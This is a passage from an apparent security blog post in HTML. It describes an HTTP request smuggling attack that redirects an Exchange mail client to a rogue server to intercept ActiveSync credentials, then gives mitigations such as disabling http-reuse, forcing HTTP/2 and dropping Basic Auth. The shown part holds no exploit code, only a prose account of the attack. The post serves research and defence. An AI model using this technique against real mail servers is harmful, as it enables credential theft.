<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html; charset=UTF-8</span></code></pre></figure><p>When Bob falls victim to the HRS attack, he will be served with the <code class="language-plaintext highlighter-rouge">451 Unavailable For Legal Reasons</code> response of the rogue server. Bob’s email client will change the server address to <code class="language-plaintext highlighter-rouge">rogue-exchange.remote</code>, as the response indicated a mailbox migration to this rogue exchange.</p><p>The first few tries of this attack didn’t work. But after trying it for several times in a row, the HRS attack finally triggered on Bob’s synchronization request, causing Bob’s mail client to change the configuration to the rogue exchange, as can be seen in Bob’s Exchange settings below.</p><p><a href="/img/harvesting-active-directory-credentials-via-http-request-smuggling/6_rogue_settings.png" target="_blank" rel="noopener noreferrer" data-lightbox="malicious-settings" data-title="Rogue settings of the Exchange client"><img src="/img/harvesting-active-directory-credentials-via-http-request-smuggling/6_rogue_settings.png" alt="Rogue settings of the Exchange client" /></a></p><p>Victory 🎉! As the rogue exchange proxies all requests to the legitimate exchange, Bob won’t notice the malicious configuration change (unless he looks at his Exchange settings). As a threat actor, we are now able to intercept all his ActiveSync requests, even after Bob changes his credentials.</p><h3 id="mitigation">Mitigation</h3><p>Multiple mitigations for HRS vulnerabilities exist. In an ideal world both the proxy and backend server (in this case Exchange) interpret HTTP requests exactly as stated in the <a href="https://tools.ietf.org/html/rfc7231" target="_blank" rel="noopener noreferrer">RFC7231</a>. That would prevent HRS vulnerabilities as both servers interpret the boundaries of HTTP requests in the same manner.</p><p>However, we are not living in the ideal world. A better mitigation is to disable <code class="language-plaintext highlighter-rouge">http-reuse</code> (a performance optimization) between the proxy and the backend, so that each request is sent over a separate network connection. Additionally, HRS could be mitigated by forcing HTTP/2 connections from the proxy to the backend, as HRS vulnerabilities cannot arise in this version of the HTTP protocol.</p><p>Finally, we strongly advise against using Basic Auth as an authentication method for Exchange. Use <a href="https://docs.microsoft.com/en-us/microsoft-365/enterprise/configure-exchange-server-for-hybrid-modern-authentication" target="_blank" rel="noopener noreferrer">modern authentication</a> instead. Using modern authentication, a threat actor could ‘only’ intercept oAuth tokens.</p></article><footer class="text-center mt-5 mb-5"><div class="footer-links"> <a href="/"><span>Posts</span></a> <a href="/about/" target="_self"><span>About</span></a> <a href="/donate/" target="_self"><span>Donate</span></a> <a href="/responsible-disclosure/" target="_self"><span>Responsible Disclosure</span></a></div><p class="footer-copyright text-secondary"> Copyright &copy; 2024 Tijme Gommers. All rights reserved.</p><div class="footer-icons"><div class="padding"> <a href="https://twitter.com/tijme" target="_blank" rel="noopener nofollow"> <span><span class="icon"> <svg><use xlink:href="/img/icons.svg#twitter"/></svg> </span></span> </a></div><div class="padding"> <a href="https://github.com/tijme" target="_blank" rel="noopener nofollow"> <span><span class="icon"> <svg><use xlink:href="/img/icons.svg#github"/></svg> </span></span> </a></div><div class="padding"> <a href="https://www.linkedin.com/in/tijme" target="_blank" rel="noopener nofollow"> <span><span class="icon"> <svg><use xlink:href="/img/icons.svg#linkedin"/></svg> </span></span> </a></div></div></footer></div></div></div></body></html>
